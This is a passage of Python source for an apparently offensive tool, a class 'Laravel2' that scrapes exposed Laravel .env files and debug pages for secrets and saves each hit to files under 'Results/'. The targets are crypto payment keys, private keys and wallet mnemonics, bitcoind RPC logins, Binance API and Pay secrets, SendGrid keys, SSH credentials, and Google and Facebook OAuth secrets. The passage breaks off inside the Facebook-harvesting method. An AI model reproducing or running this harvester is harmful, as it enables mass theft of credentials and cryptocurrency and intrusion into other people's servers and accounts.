import urllib.parse
from re import findall as reg


class Laravel2:

    def grab_cryptopay(self, page, star):
        global cryptopay_api
        try:
            if "CRYPTO_PAY_KEY=" in page or "CRYPTO_PAY_KEY = " in page or "<td>CRYPTO_PAY_KEY<\\/td>" in page:
                if "CRYPTO_PAY_KEY=" in page:
                    try:
                        cryptopay_api = reg("CRYPTO_PAY_KEY=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        cryptopay_api = ''
                elif "CRYPTO_PAY_KEY = " in page:
                    try:
                        cryptopay_api = reg("CRYPTO_PAY_KEY = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        cryptopay_api = ''
                elif "<td>CRYPTO_PAY_KEY</td>" in page:
                    try:
                        cryptopay_api = reg("<td>CRYPTO_PAY_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        cryptopay_api = ''
                if cryptopay_api == '':
                    return False
                else:
                    build = f"BTC_API_URL: {star}\nCRYPTO_PAY_KEY: {cryptopay_api}"
                    remover = build.replace('\r', '')
                    crypto_pay_schrijf = open("Results/CRYPTO_PAY_API.txt", "a")
                    crypto_pay_schrijf.write(remover + '\n\n')
                    crypto_pay_schrijf.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_privatekey_pass(self, page, star):
        global private_key
        try:
            if "PRIVATE_KEY_PASS=" in page or "PRIVATE_KEY_PASS = " in page or "<td>PRIVATE_KEY_PASS<\\/td>" in page:
                if "PRIVATE_KEY_PASS=" in page:
                    try:
                        private_key = reg("PRIVATE_KEY_PASS=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        private_key = ''
                elif "PRIVATE_KEY_PASS = " in page:
                    try:
                        private_key = reg("PRIVATE_KEY_PASS = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        private_key = ''
                elif "<td>PRIVATE_KEY_PASS</td>" in page:
                    try:
                        private_key = reg("<td>PRIVATE_KEY_PASS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        private_key = ''
                if private_key == '':
                    return False
                else:
                    build = f"PRIVATE_KEY_PASS_URL: {star}\nPRIVATE_KEY_PASS: {private_key}"
                    remover = build.replace('\r', '')
                    private_key_schrijf = open("Results/Private_Key_pass.txt", "a")
                    private_key_schrijf.write(remover + '\n\n')
                    private_key_schrijf.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_privatekey2(self, page, star):
        global private_key
        try:
            if "YOUR_MNEMONIC=" in page or "YOUR_MNEMONIC = " in page or "<td>YOUR_MNEMONIC<\\/td>" in page:
                if "YOUR_MNEMONIC=" in page:
                    try:
                        private_key = reg("YOUR_MNEMONIC=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        private_key = ''
                elif "YOUR_MNEMONIC = " in page:
                    try:
                        private_key = reg("YOUR_MNEMONIC = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        private_key = ''
                elif "<td>YOUR_MNEMONIC</td>" in page:
                    try:
                        private_key = reg("<td>YOUR_MNEMONIC<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        private_key = ''
                if private_key == '':
                    return False
                else:
                    build = f"PRIVATE_KEY_PASS_URL: {star}\nPRIVATE_KEY_PASS: {private_key}"
                    remover = build.replace('\r', '')
                    private_key_schrijf = open("Results/Private_Key.txt", "a")
                    private_key_schrijf.write(remover + '\n\n')
                    private_key_schrijf.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_private_key(self, page, star):
        global private_key
        try:
            if "private_key=" in page or "private_key = " in page or "<td>private_key<\\/td>" in page \
                    or "<td>PRIVATE_KEY<\\/td>" in page:
                if "private_key=" in page or "PRIVATE_KEY=" in page:
                    try:
                        private_key = reg("private_key=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        try:
                            private_key = reg("PRIVATE_KEY=(.*?)\n", page)[0].replace("\n", "").replace(
                                "\r", "").replace('"', '')
                        except:
                            private_key = ''
                elif "private_key = " in page or "PRIVATE_KEY = " in page:
                    try:
                        private_key = reg("private_key = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        try:
                            private_key = reg("PRIVATE_KEY = (.*?)\n", page)[0].replace("\n", "").replace(
                                "\r", "").replace('"', '')
                        except:
                            private_key = ''
                elif "<td>private_key</td>" in page or "<td>PRIVATE_KEY<\\/td>" in page:
                    try:
                        private_key = reg("<td>private_key<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        try:
                            private_key = reg("<td>PRIVATE_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                                "\n", "").replace("\r", "").replace('"', '')
                        except:
                            private_key = ''
                if private_key == '':
                    return False
                else:
                    build = f"PRIVATE_KEY_URL: {star}\nprivate_key: {private_key}"
                    remover = build.replace('\r', '')
                    private_key_schrijf = open("Results/Private_Key.txt", "a")
                    private_key_schrijf.write(remover + '\n\n')
                    private_key_schrijf.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_blockchain(self, page, star):
        global blockchain, blockchain_fee, blockchain_tr
        try:
            if "BLOCKCHAIN_API=" in page or "BLOCKCHAIN_API = " in page or "<td>BLOCKCHAIN_API" in page:
                if "BLOCKCHAIN_API=" in page:
                    try:
                        blockchain = reg("BLOCKCHAIN_API=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        blockchain = ''
                    try:
                        blockchain_fee = reg("DEFAULT_BTC_FEE=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        blockchain_fee = ''
                    try:
                        blockchain_tr = reg("TRANSACTION_BTC_FEE=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        blockchain_tr = ''
                elif "BLOCKCHAIN_API = " in page:
                    try:
                        blockchain = reg("BLOCKCHAIN_API = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        blockchain = ''
                    try:
                        blockchain_fee = reg("DEFAULT_BTC_FEE=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        blockchain_fee = ''
                    try:
                        blockchain_tr = reg("TRANSACTION_BTC_FEE=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        blockchain_tr = ''
                elif "<td>BLOCKCHAIN_API</td>" in page:
                    try:
                        blockchain = reg("<td>BLOCKCHAIN_API<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        blockchain = ''
                    try:
                        blockchain_fee = reg("<td>DEFAULT_BTC_FEE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        blockchain_fee = ''
                    try:
                        blockchain_tr = reg("<td>TRANSACTION_BTC_FEE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        blockchain_tr = ''
                if blockchain == '':
                    pass
                else:
                    build = f"BLOCKCHAIN_URL: {star}\nBLOCKCHAIN_API: {blockchain}\nTRANSACTION_BTC_FEE:" \
                            f" {blockchain_fee}\nTRANSACTION_BTC_FEE: {blockchain_tr} "
                    remover = build.replace('\r', '')
                    blockchain_schrijf = open("Results/Blockchain_APIKEY.txt", "a")
                    blockchain_schrijf.write(remover + '\n\n')
                    blockchain_schrijf.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_sendgrid(self, page):
        global cryptopay_api, sendgrid_api
        try:
            if "SENDGRID_KEY=" in page or "SENDGRID_KEY = " in page or "<td>SENDGRID_KEY<\\/td>" in page or \
                    "SENDGRID_API_KEY=" in page or "SENDGRID_API_KEY = " in page or "<td>SENDGRID_API_KEY<\\/td>" in page:
                if "SENDGRID_KEY=" in page:
                    try:
                        sendgrid_api = reg("SENDGRID_KEY=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        sendgrid_api = ''
                elif "SENDGRID_KEY = " in page:
                    try:
                        sendgrid_api = reg("SENDGRID_KEY = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        sendgrid_api = ''
                elif "<td>SENDGRID_KEY</td>" in page:
                    try:
                        sendgrid_api = reg("<td>SENDGRID_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        sendgrid_api = ''
                if "SENDGRID_API_KEY=" in page:
                    try:
                        sendgrid_api = reg("SENDGRID_API_KEY=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        sendgrid_api = ''
                elif "SENDGRID_API_KEY = " in page:
                    try:
                        sendgrid_api = reg("SENDGRID_API_KEY = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        sendgrid_api = ''
                elif "<td>SENDGRID_API_KEY</td>" in page:
                    try:
                        sendgrid_api = reg("<td>SENDGRID_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        sendgrid_api = ''
                if sendgrid_api == '':
                    return False
                else:
                    smtp_username = "apikey"
                    builder = smtp_username + '|' + sendgrid_api
                    remover = builder.replace('\r', '')
                    sendgridsmtp = open('Results/sendgrid_api.txt', 'a')
                    sendgridsmtp.write(remover + '\n')
                    sendgridsmtp.close()
                    return smtp_username, sendgrid_api
            else:
                return False
        except:
            return False

    def grab_bitcoin(self, page, star):
        global btc_username, btc_password, btc_host, btc_port, btc_confirm
        try:
            if "BITCOIND_HOST=" in page or "BITCOIND_HOST = " in page or "<td>BITCOIND_HOST</td>" in page:
                if "BITCOIND_HOST=" in page:
                    try:
                        btc_host = reg("BITCOIND_HOST=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_host = ''
                    try:
                        btc_port = reg("BITCOIND_PORT=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_port = ''
                    try:
                        btc_username = reg("BITCOIND_USER=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_username = ''
                    try:
                        btc_password = reg("BITCOIND_PASSWORD=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_password = ''
                    try:
                        btc_confirm = reg("BITCOIND_MIN_CONFIRMATIONS=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_confirm = ''
                elif "BITCOIND_HOST = " in page:
                    try:
                        btc_host = reg("BITCOIND_HOST = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_host = ''
                    try:
                        btc_port = reg("BITCOIND_PORT = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_port = ''
                    try:
                        btc_username = reg("BITCOIND_USER = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_username = ''
                    try:
                        btc_password = reg("BITCOIND_PASSWORD = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_password = ''
                    try:
                        btc_confirm = reg("BITCOIND_MIN_CONFIRMATIONS = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_confirm = ''
                elif "<td>BITCOIND_HOST</td>" in page:
                    try:
                        btc_host = reg("<td>BITCOIND_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_host = ''
                    try:
                        btc_port = reg("<td>BITCOIND_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_port = ''
                    try:
                        btc_username = reg("<td>BITCOIND_USER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_username = ''
                    try:
                        btc_password = reg("<td>BITCOIND_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_password = ''
                    try:
                        btc_confirm = reg("<td>BITCOIND_MIN_CONFIRMATIONS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_confirm = ''
                if btc_username == '' or btc_password == '':
                    return False
                else:
                    build = f"BITCOIND_URL: {star}\nBITCOIND_HOST: {btc_host}\nBITCOIND_PORT: {btc_port}\n" \
                            f"BITCOIND_USERNAME: {btc_username}\nBITCOIND_PASSWORD: " \
                            f"{btc_password}\nBITCOIND_MIN_CONFIRMATIONS: {btc_confirm}"
                    remover = build.replace('\r', '')
                    btc_schrijf = open("Results/BITCOIND_FOUND.txt", "a")
                    btc_schrijf.write(remover + '\n\n')
                    btc_schrijf.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_binance_api(self, page, star):
        global bnb_key, bnb_sec, bnb_min, bnb_max, bnb_active, bnb_testnet
        try:
            if "BINANCE_API_KEY=" in page or "BINANCE_API_KEY = " in page or "<td>BINANCE_API_KEY</td>" in page:
                if "BINANCE_API_KEY=" in page:
                    try:
                        bnb_key = reg("BINANCE_API_KEY=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_key = ''
                    try:
                        bnb_sec = reg("BINANCE_API_SECRET=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_sec = ''
                elif "BINANCE_API_KEY = " in page:
                    try:
                        bnb_key = reg("BINANCE_API_KEY = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_key = ''
                    try:
                        bnb_sec = reg("BINANCE_API_SECRET = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_sec = ''
                elif "<td>BINANCE_API_KEY</td>" in page:
                    try:
                        bnb_key = reg("<td>BINANCE_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_key = ''
                    try:
                        bnb_sec = reg("<td>BINANCE_API_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_sec = ''
                    try:
                        bnb_testnet = reg("<td>BINANCE_API_TESTNET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_testnet = ''
                if bnb_key == '' or bnb_sec == '':
                    return False
                else:
                    build = f"BNB_URL: {star}\nBINANCE_API_KEY: {bnb_key}\nBINANCE_API_SECRET: {bnb_sec}\n" \
                            f"BINANCE_API_TESTNET: {bnb_testnet}"
                    remover = build.replace('\r', '')
                    btc_schrijf = open("Results/BINANCE_APIKEY_FOUND.txt", "a")
                    btc_schrijf.write(remover + '\n\n')
                    btc_schrijf.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_binance_pay(self, page, star):
        global bnb_key, bnb_sec, bnb_min, bnb_max, bnb_active
        try:
            if "BINANCE_PAY_API_KEY=" in page or "BINANCE_PAY_API_KEY = " in page or "<td>BINANCE_PAY_API_KEY</td>" in page:
                if "BINANCE_PAY_API_KEY=" in page:
                    try:
                        bnb_key = reg("BINANCE_PAY_API_KEY=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_key = ''
                    try:
                        bnb_sec = reg("BINANCE_PAY_SECRET=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_sec = ''
                    try:
                        bnb_min = reg("BINANCE_PAY_MIN=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_min = ''
                    try:
                        bnb_max = reg("BINANCE_PAY_MAX=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_max = ''
                    try:
                        bnb_active = reg("BINANCE_PAY_ACTIVE=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_active = ''
                elif "BINANCE_PAY_API_KEY = " in page:
                    try:
                        bnb_key = reg("BINANCE_PAY_API_KEY = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_key = ''
                    try:
                        bnb_sec = reg("BINANCE_PAY_SECRET = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_sec = ''
                    try:
                        bnb_min = reg("BINANCE_PAY_MIN = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_min = ''
                    try:
                        bnb_max = reg("BINANCE_PAY_MAX = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_max = ''
                    try:
                        bnb_active = reg("BINANCE_PAY_ACTIVE = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_active = ''
                elif "<td>BINANCE_PAY_API_KEY</td>" in page:
                    try:
                        bnb_key = reg("<td>BINANCE_PAY_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_key = ''
                    try:
                        bnb_sec = reg("<td>BINANCE_PAY_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_sec = ''
                    try:
                        bnb_min = reg("<td>BINANCE_PAY_MIN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_min = ''
                    try:
                        bnb_max = reg("<td>BINANCE_PAY_MAX<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_max = ''
                    try:
                        bnb_active = reg("<td>BINANCE_PAY_ACTIVE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_active = ''
                if bnb_key == '' or bnb_sec == '':
                    return False
                else:
                    build = f"BNB_URL: {star}\nBINANCE_PAY_API: {bnb_key}\nBINANCE_PAY_SECRET: {bnb_sec}\n" \
                            f"BINANCE_PAY_MIN: {bnb_min}\nBINANCE_PAY_MAX: " \
                            f"{bnb_max}\nBINANCE_PAY_ACTIVE: {bnb_active}"
                    remover = build.replace('\r', '')
                    bnb_schrijf = open("Results/BINANCE_PAY_FOUND.txt", "a")
                    bnb_schrijf.write(remover + '\n\n')
                    bnb_schrijf.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_binance_privatekeys(self, page, star):
        global bnb_key, bnb_sec
        try:
            if "BINANCE_KEY_PUBLIC=" in page or "BINANCE_KEY_PUBLIC = " in page or "<td>BINANCE_KEY_PUBLIC</td>" in page:
                if "BINANCE_KEY_PUBLIC=" in page:
                    try:
                        bnb_key = reg("BINANCE_KEY_PUBLIC=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_key = ''
                    try:
                        bnb_sec = reg("BINANCE_KEY_SECRET=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_sec = ''
                elif "BINANCE_KEY_PUBLIC = " in page:
                    try:
                        bnb_key = reg("BINANCE_KEY_PUBLIC = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_key = ''
                    try:
                        bnb_sec = reg("BINANCE_KEY_SECRET = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        bnb_sec = ''
                elif "<td>BINANCE_KEY_PUBLIC</td>" in page:
                    try:
                        bnb_key = reg("<td>BINANCE_KEY_PUBLIC<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_key = ''
                    try:
                        bnb_sec = reg("<td>BINANCE_KEY_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        bnb_sec = ''
                if bnb_key == '' or bnb_sec == '':
                    return False
                else:
                    build = f"BNB_URL: {star}\nBINANCE_KEY_PUBLIC: {bnb_key}\nBINANCE_KEY_SECRET: {bnb_sec}\n"
                    remover = build.replace('\r', '')
                    btc_schrijf = open("Results/BINANCE_PRIVATEKEY_FOUND.txt", "a")
                    btc_schrijf.write(remover + '\n\n')
                    btc_schrijf.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_ssh(self, page):
        global ssh_username, ssh_password, ssh_host
        try:
            if "SSH_HOST=" in page or "SSH_HOST = " in page or "<td>SSH_HOST" in page:
                if "SSH_HOST=" in page:
                    try:
                        ssh_host = reg("SSH_HOST=(.*?)\n", page)[0].replace("\n", "").replace("\r", "").replace('"',
                                                                                                                  '')
                    except:
                        ssh_host = ''
                    try:
                        ssh_username = reg("SSH_USERNAME=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        ssh_username = ''
                    try:
                        ssh_password = reg("SSH_PASSWORD=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        ssh_password = ''
                elif "SSH_HOST = " in page:
                    try:
                        ssh_host = reg("SSH_HOST = (.*?)\n", page)[0].replace("\n", "").replace("\r", "").replace('"',
                                                                                                                    '')
                    except:
                        ssh_host = ''
                    try:
                        ssh_username = reg("SSH_USERNAME = (.*?)\n", page)[0].replace("\n", "").replace("\r",
                                                                                                          "").replace(
                            '"', '')
                    except:
                        ssh_username = ''
                    try:
                        ssh_password = reg("SSH_PASSWORD = (.*?)\n", page)[0].replace("\n", "").replace("\r",
                                                                                                          "").replace(
                            '"', '')
                    except:
                        ssh_password = ''
                elif "<td>SSH_HOST</td>" in page:
                    try:
                        ssh_host = reg("<td>SSH_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace("\n",
                                                                                                            "").replace(
                            "\r", "").replace('"', '')
                    except:
                        ssh_host = ''
                    try:
                        ssh_username = reg("<td>SSH_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        ssh_username = ''
                    try:
                        ssh_password = reg("<td>SSH_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        ssh_password = ''
                if ssh_username == '' or ssh_password == '':
                    return False
                else:
                    build = f"SSH_HOSTNAME: {ssh_host}\nSSH_PASSWORD: {ssh_username}\nSSH_PASSWORD: {ssh_password} "
                    remover = build.replace('\r', '')
                    ssh = open("Results/SSH_INFO_FOUND.txt", "a")
                    ssh.write(remover + '\n\n')
                    ssh.close()
                    return ssh_host, ssh_username, ssh_password
            else:
                return False
        except:
            return False

    def grab_google(self, page):
        global google_id, google_redi, google_secret
        try:
            if "G+_CLIENT_ID=" in page or "G+_CLIENT_ID = " in page or "<td>G+_CLIENT_ID" in page or \
                    "GOOGLE_CLIENT_ID=" in page or "GOOGLE_CLIENT_ID = " in page or "<td>GOOGLE_CLIENT_ID" in page:
                if "G+_CLIENT_ID=" in page:
                    try:
                        google_id = reg("G+_CLIENT_ID=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_id = ''
                    try:
                        google_secret = reg("G+_CLIENT_SECRET=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        google_secret = ''
                    try:
                        google_redi = reg("G+_REDIRECT=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        google_redi = ''
                elif "GOOGLE_CLIENT_ID=" in page:
                    try:
                        google_id = reg("GOOGLE_CLIENT_ID=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_id = ''
                    try:
                        google_secret = reg("GOOGLE_CLIENT_SECRET=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        google_secret = ''
                    try:
                        google_redi = reg("GOOGLE_REDIRECT=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        google_redi = ''
                elif "G+_CLIENT_ID = " in page:
                    try:
                        google_id = reg("G+_CLIENT_ID = (.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_id = ''
                    try:
                        google_secret = reg("G+_CLIENT_SECRET = (.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_secret = ''
                    try:
                        google_redi = reg("G+_REDIRECT = (.*?)\n", page)[0].replace("\n", "").replace("\r",
                                                                                                        "").replace(
                            '"', '')
                    except:
                        google_redi = ''
                elif "GOOGLE_CLIENT_ID = " in page:
                    try:
                        google_id = reg("GOOGLE_CLIENT_ID = (.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_id = ''
                    try:
                        google_secret = reg("GOOGLE_CLIENT_SECRET = (.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_secret = ''
                    try:
                        google_redi = reg("GOOGLE_REDIRECT = (.*?)\n", page)[0].replace("\n", "").replace("\r",
                                                                                                            "").replace(
                            '"', '')
                    except:
                        google_redi = ''
                elif "<td>G+_CLIENT_ID<\\/td>" in page:
                    try:
                        google_id = reg("<td>G+_CLIENT_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_id = ''
                    try:
                        google_secret = reg("<td>G+_CLIENT_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_secret = ''
                    try:
                        google_redi = reg("<td>G+_REDIRECT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_redi = ''
                elif "<td>GOOGLE_CLIENT_ID</td>" in page:
                    try:
                        google_id = reg("<td>GOOGLE_CLIENT_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_id = ''
                    try:
                        google_secret = reg("<td>GOOGLE_CLIENT_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_secret = ''
                    try:
                        google_redi = reg("<td>GOOGLE_REDIRECT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        google_redi = ''
                if google_id == '' or google_secret == '':
                    return False
                else:
                    build = f"G+_CLIENT_ID: {google_id}\nG+_CLIENT_SECRET: {google_secret}\nG+_REDIRECT: {google_redi}"
                    remover = build.replace('\r', '')
                    ssh = open("Results/G+_INFO_FOUND.txt", "a")
                    ssh.write(remover + '\n\n')
                    ssh.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_facebook(self, page):
        global facebook_secret, facebook_id, facebook_redi
        try:
            if "FACEBOOK_CLIENT_ID=" in page or "FACEBOOK_CLIENT_ID = " in page or "<td>FACEBOOK_CLIENT_ID</td>" in page:
                if "FACEBOOK_CLIENT_ID=" in page:
                    try:
                        facebook_id = reg("FACEBOOK_CLIENT_ID=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        facebook_id = ''
                    try:
                        facebook_secret = reg("FACEBOOK_CLIENT_SECRET=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        facebook_secret = ''
                    try:
                        facebook_redi = reg("FACEBOOK_CALLBACK_URL=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        facebook_redi = ''
                elif "FACEBOOK_CLIENT_ID = " in page:
                    try:
                        facebook_id = reg("FACEBOOK_CLIENT_ID = (.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        facebook_id = ''
                    try:
                        facebook_secret = reg("FACEBOOK_CLIENT_SECRET = (.*?)\n", page)[0].replace(
